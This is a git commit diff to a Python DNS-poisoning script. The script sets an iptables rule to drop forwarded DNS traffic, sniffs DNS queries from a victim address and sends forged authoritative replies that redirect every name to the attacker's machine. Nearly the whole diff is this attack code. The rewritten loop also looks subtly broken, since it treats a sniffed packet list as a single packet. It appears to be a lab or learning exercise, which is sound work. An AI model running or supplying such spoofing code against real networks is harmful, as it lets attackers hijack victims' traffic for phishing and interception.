b6f71ae69e966ae6a641308a15d6bb27adc25870
m4ul <hansonlucas06@gmail.com>
2022-11-10 20:26:03 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -7,22 +7,12 @@ routerIP = "10.5.1.254"
 ownIP = "10.5.1.3"
 gotoIP = "10.5.1.3"
 
-def forwarding():
-    firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
-    Popen([firewall], shell=True, stdout=PIPE)
+firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
+Popen([firewall], shell=True, stdout=PIPE)
 
-def sniffDNS():
-    sniff(filter="udp and port 53", prn = spoofDNS)
 
-def spoofDNS(packet):
-    if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
-        srp((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
-
-if __name__ == '__main__':
-    
-    forwarding()
-
-    packet  = sniff(filter="udp and port 53", prn = spoofDNS)
+while True:
+    packet  = sniff(filter="udp and port 53")
     if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
         srp((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
 
